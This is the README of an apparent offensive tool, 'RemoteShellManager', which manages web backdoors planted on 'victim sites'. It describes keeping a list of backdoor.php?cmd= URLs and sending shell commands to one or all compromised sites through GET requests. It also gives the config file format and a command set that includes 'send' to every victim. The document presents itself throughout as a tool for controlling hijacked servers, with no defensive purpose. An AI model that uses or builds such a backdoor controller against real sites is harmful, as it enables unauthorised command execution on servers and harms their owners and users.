# RemoteShellManager
RemoteShellManager is utility to control your backdoors on victim sites.

# Basement
Coded on C++ with curl. Cross-platform project.

# How it is works?
This utility keep base with all your **web-backdoors** on **your disk**.

When you want to send request to all victims or selected victim you write id of victim.

Then you write your command. After all RemoteShellManager send request like this: ```"http://url.here/backdoor.php?cmd=whoami"```.

For this example command is "whoami". Answer(s) of request(s) you'll see.

**Utility can send only GET requests!**

# Config file
For add/remove use relevant commands.

Config file structure looks like:
```
1    http://url1.here/backdoor.php?cmd=
2    http://url2.here/backdoor.php?cmd=
3    http://url3.here/backdoor.php?cmd=
```
First column is ID. Second column is victim site.

Name of config file is backdoor_base.conf


# Commands and their templates.
```
help - Show message with commands
exit - Exit
clear - Clear screen. Works only on linux, because it using system("clear")
add <url here with backdoor param> - Add record to base. ID will be assigned automaticlly
remove <id> - Remove backdoor with <id> from base
show - Show all records from base
sendto <id> <command> - Send command to **<id>** victim.
send <command> - Send command to **all** victims.

```
